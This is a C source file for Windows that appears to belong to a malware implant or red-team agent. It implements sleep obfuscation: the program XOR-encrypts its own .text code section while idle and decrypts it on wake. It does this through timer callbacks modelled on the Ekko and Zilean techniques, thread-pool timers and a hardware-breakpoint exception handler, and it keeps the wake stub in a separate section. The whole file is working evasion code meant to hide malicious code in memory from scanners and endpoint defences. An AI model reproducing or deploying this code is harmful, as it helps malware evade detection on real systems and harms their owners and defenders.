#include <windows.h>
#include "../../include/config.h"

/* Wake/decrypt logic lives outside .text so it survives sleep encryption */
#if defined(_MSC_VER)
#pragma section(".sleep_stub", read, execute)
#define SLEEP_STUB __declspec(allocate(".sleep_stub"))
#else
#define SLEEP_STUB __attribute__((section(".sleep_stub"), used, noinline))
#endif

typedef struct {
    void *text_base;
    DWORD text_size;
    BYTE xor_key[16];
    int key_len;
} SleepStubContext;

typedef struct {
    SleepStubContext crypt;
    HANDLE hEvent;
    BOOL (WINAPI *pSetEvent)(HANDLE);
} SleepWakeSignalCtx;

typedef struct {
    SleepStubContext crypt;
    volatile LONG *toggle_count;
    volatile LONG *encrypted_flag;
} SleepHwbpStubCtx;

static SleepHwbpStubCtx g_hwbp_stub_ctx;

SLEEP_STUB
void __stdcall sleep_wake_decrypt(SleepStubContext *ctx) {
    BYTE *p;
    DWORD i;

    if (!ctx || !ctx->text_base || ctx->text_size == 0 || ctx->key_len <= 0)
        return;

    p = (BYTE *)ctx->text_base;
    for (i = 0; i < ctx->text_size; i++)
        p[i] ^= ctx->xor_key[i % (DWORD)ctx->key_len];

    {
        DWORD old;
        VirtualProtect(ctx->text_base, ctx->text_size, PAGE_EXECUTE_READ, &old);
    }
}

SLEEP_STUB
void __stdcall sleep_pre_encrypt(SleepStubContext *ctx) {
    BYTE *p;
    DWORD i;

    if (!ctx || !ctx->text_base || ctx->text_size == 0 || ctx->key_len <= 0)
        return;

    {
        DWORD old;
        VirtualProtect(ctx->text_base, ctx->text_size, PAGE_READWRITE, &old);
    }

    p = (BYTE *)ctx->text_base;
    for (i = 0; i < ctx->text_size; i++)
        p[i] ^= ctx->xor_key[i % (DWORD)ctx->key_len];
}

SLEEP_STUB
void __stdcall sleep_wake_signal(SleepWakeSignalCtx *ctx) {
    if (!ctx)
        return;
    sleep_wake_decrypt(&ctx->crypt);
    if (ctx->pSetEvent && ctx->hEvent)
        ctx->pSetEvent(ctx->hEvent);
}

SLEEP_STUB
void CALLBACK sleep_ekko_timer_wake(PVOID param, BOOLEAN timer_or_wait_fired) {
    (void)timer_or_wait_fired;
    sleep_wake_signal((SleepWakeSignalCtx *)param);
}

SLEEP_STUB
void CALLBACK sleep_zilean_timer_apc(PVOID param, DWORD timer_low, DWORD timer_high) {
    (void)timer_low;
    (void)timer_high;
    sleep_wake_decrypt((SleepStubContext *)param);
}

SLEEP_STUB
void CALLBACK sleep_tp_timer_wake(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_TIMER timer) {
    (void)inst;
    (void)timer;
    sleep_wake_signal((SleepWakeSignalCtx *)ctx);
}

SLEEP_STUB
LONG WINAPI sleep_hwbp_veh_handler(EXCEPTION_POINTERS *ep) {
    if (!ep || !ep->ExceptionRecord || !ep->ContextRecord)
        return EXCEPTION_CONTINUE_SEARCH;

    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if (g_hwbp_stub_ctx.encrypted_flag && *(g_hwbp_stub_ctx.encrypted_flag))
        sleep_wake_decrypt(&g_hwbp_stub_ctx.crypt);
    else
        sleep_pre_encrypt(&g_hwbp_stub_ctx.crypt);

    if (g_hwbp_stub_ctx.encrypted_flag)
        *(g_hwbp_stub_ctx.encrypted_flag) = !*(g_hwbp_stub_ctx.encrypted_flag);

    if (g_hwbp_stub_ctx.toggle_count)
        InterlockedIncrement(g_hwbp_stub_ctx.toggle_count);

    ep->ContextRecord->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

SLEEP_STUB
int sleep_stub_self_test(void) {
    HMODULE hMod;
    IMAGE_NT_HEADERS *nt;
    IMAGE_SECTION_HEADER *sec;
    void *text_start = NULL;
    DWORD text_size = 0;
    void *self;
    int i;

    hMod = GetModuleHandleA(NULL);
    if (!hMod)
        return 0;

    nt = (IMAGE_NT_HEADERS *)((BYTE *)hMod + ((IMAGE_DOS_HEADER *)hMod)->e_lfanew);
    sec = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            text_start = (BYTE *)hMod + sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!text_start || text_size == 0)
        return 0;

    self = (void *)sleep_stub_self_test;
    if (self >= text_start && self < (BYTE *)text_start + text_size)
        return 0;

    return 1;
}

void sleep_hwbp_stub_bind(SleepStubContext *crypt,
                          volatile LONG *toggle_count,
                          volatile LONG *encrypted_flag) {
    if (crypt)
        g_hwbp_stub_ctx.crypt = *crypt;
    g_hwbp_stub_ctx.toggle_count = toggle_count;
    g_hwbp_stub_ctx.encrypted_flag = encrypted_flag;
}
